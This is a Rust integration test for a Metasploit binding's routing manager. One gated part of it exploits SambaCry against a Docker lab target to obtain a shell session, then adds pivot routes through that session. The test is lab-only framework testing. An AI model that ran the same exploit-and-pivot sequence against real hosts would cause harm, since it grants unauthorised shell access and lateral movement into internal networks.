// Consolidated test: All routing operations
// Run with: ./run_tests.sh --test test_route
//
// This consolidates:
//   - test_route_basic.rs (basic routing table operations, no session required)
//   - test_route_integration.rs (full routing with real session, requires Docker)
//
// Magnus pattern: Ruby VM can only init once per process, so all routing tests
// are combined into a single test function with multiple sub-tests.

mod common;

use msf::Framework;
use std::env;

#[test]
fn it_tests_routing_operations_comprehensively() {
    let _ruby = common::init_msf();
    let framework = Framework::new(None).expect("Failed to create framework");

    // Get route manager
    let routes = framework.routes().expect("Failed to get RouteManager");
    println!("✓ Got RouteManager");

    // =========================================================================
    // Sub-test 1: Basic routing table operations (no session required)
    // =========================================================================
    println!("\n=== Testing Basic Routing Table Operations ===");

    // List routes - should work even if empty
    let route_list = routes.list_routes().expect("Failed to list routes");
    println!("✓ Listed {} routes", route_list.len());

    // Flush routes - should work even if empty
    routes.flush_routes().expect("Failed to flush routes");
    println!("✓ Flushed routes");

    // Verify flush worked
    let after_flush = routes.list_routes().expect("Failed to list routes after flush");
    assert!(after_flush.is_empty(), "Routes should be empty after flush");
    println!("✓ Verified routes are empty after flush");

    // Check route_exists for non-existent route
    let exists = routes.route_exists("10.10.10.0", "255.255.255.0")
        .expect("Failed to check route_exists");
    assert!(!exists, "Non-existent route should return false");
    println!("✓ route_exists returns false for non-existent route");

    // Check best_comm for address with no route
    let best = routes.best_comm("10.10.10.50").expect("Failed to check best_comm");
    assert!(best.is_none(), "best_comm should return None when no route exists");
    println!("✓ best_comm returns None when no route exists");

    println!("✓ Basic routing table operations tests passed");

    // =========================================================================
    // Sub-test 2: Full routing integration with session (requires Docker)
    // =========================================================================
    println!("\n=== Testing Routing Integration with Session ===");

    // Skip if not in integration test environment
    if env::var("INTEGRATION_TESTS").unwrap_or_default().to_lowercase() != "true" {
        println!("⏭ Skipping integration test (set INTEGRATION_TESTS=true to run)");
        println!("  Prerequisites: cd docker && docker compose up -d target-linux");
        println!("✓ Routing tests passed (basic only, integration skipped)");
        return;
    }

    let target_host = env::var("TARGET_HOST").unwrap_or_else(|_| "172.19.0.2".to_string());
    println!("🎯 Target host: {}", target_host);

    // =========================================================================
    // Step 1: Exploit target to get a session
    // =========================================================================
    println!("\n[*] Exploiting SambaCry on {}...", target_host);

    let exploit = framework
        .create_module("exploit/linux/samba/is_known_pipename")
        .expect("Failed to create exploit module");

    exploit.set_option("RHOSTS", &target_host).expect("Failed to set RHOSTS");
    exploit.set_option("SMB_SHARE_NAME", "myshare").expect("Failed to set SMB_SHARE_NAME");

    // Get sessions before exploit
    let sessions = framework.sessions().expect("Failed to get sessions");
    let sessions_before: Vec<i64> = sessions.list().expect("Failed to list sessions");

    // Run exploit
    let _ = exploit.exploit("cmd/unix/interact", None).expect("Failed to run exploit");

    // Poll for new session (exploit_simple may not return session ID directly)
    let mut session_id: Option<i64> = None;
    for _ in 0..30 {
        std::thread::sleep(std::time::Duration::from_secs(1));
        let sessions_now = sessions.list().expect("Failed to list sessions");
        for sid in &sessions_now {
            if !sessions_before.contains(sid) {
                session_id = Some(*sid);
                break;
            }
        }
        if session_id.is_some() {
            break;
        }
    }

    let session_id = match session_id {
        Some(id) => {
            println!("✓ Got session: {}", id);
            id
        }
        None => {
            panic!("❌ Failed to get session from exploit after 30s - is target-linux running?");
        }
    };

    // =========================================================================
    // Step 2: Test routing operations with session
    // =========================================================================

    // Ensure routing table starts clean
    routes.flush_routes().expect("Failed to flush routes");
    let initial_routes = routes.list_routes().expect("Failed to list routes");
    assert!(initial_routes.is_empty(), "Routes should be empty after flush");
    println!("✓ Routing table is empty");

    // Add a route through the session
    let added = routes.add_route("10.10.10.0", "255.255.255.0", session_id)
        .expect("Failed to add route");
    assert!(added, "Route should be added successfully");
    println!("✓ Added route 10.10.10.0/24 via session {}", session_id);

    // Verify route exists
    let exists = routes.route_exists("10.10.10.0", "255.255.255.0")
        .expect("Failed to check route_exists");
    assert!(exists, "Route should exist");
    println!("✓ route_exists confirms route exists");

    // List routes
    let route_list = routes.list_routes().expect("Failed to list routes");
    assert_eq!(route_list.len(), 1, "Should have exactly 1 route");
    println!("✓ Listed {} route(s)", route_list.len());

    let route = &route_list[0];
    assert_eq!(route.subnet, "10.10.10.0");
    assert_eq!(route.netmask, "255.255.255.0");
    assert_eq!(route.session_id, Some(session_id));
    println!("✓ Route details: {}/{} via Session {}", route.subnet, route.netmask, session_id);

    // Check best_comm for an address in the routed subnet
    let best = routes.best_comm("10.10.10.50").expect("Failed to check best_comm");
    assert_eq!(best, Some(session_id), "best_comm should return session ID for routed address");
    println!("✓ best_comm(10.10.10.50) = Session {}", session_id);

    // Add another route
    routes.add_route("192.168.100.0", "255.255.255.0", session_id)
        .expect("Failed to add second route");
    let route_list = routes.list_routes().expect("Failed to list routes");
    assert_eq!(route_list.len(), 2, "Should have 2 routes");
    println!("✓ Added second route, now have {} routes", route_list.len());

    // Remove one route
    let removed = routes.remove_route("10.10.10.0", "255.255.255.0", session_id)
        .expect("Failed to remove route");
    assert!(removed, "Route should be removed successfully");
    println!("✓ Removed route 10.10.10.0/24");

    let after_remove = routes.list_routes().expect("Failed to list routes");
    assert_eq!(after_remove.len(), 1, "Should have 1 route after removal");

    // Flush all routes
    routes.flush_routes().expect("Failed to flush routes");
    let after_final_flush = routes.list_routes().expect("Failed to list routes");
    assert!(after_final_flush.is_empty(), "Routes should be empty after flush");
    println!("✓ Flushed all routes");

    // =========================================================================
    // Step 3: Cleanup
    // =========================================================================
    sessions.kill(session_id).expect("Failed to kill session");
    println!("✓ Cleaned up session {}", session_id);

    println!("✓ Routing integration tests passed");

    // =========================================================================
    println!("\n✓ All routing tests passed!");
}
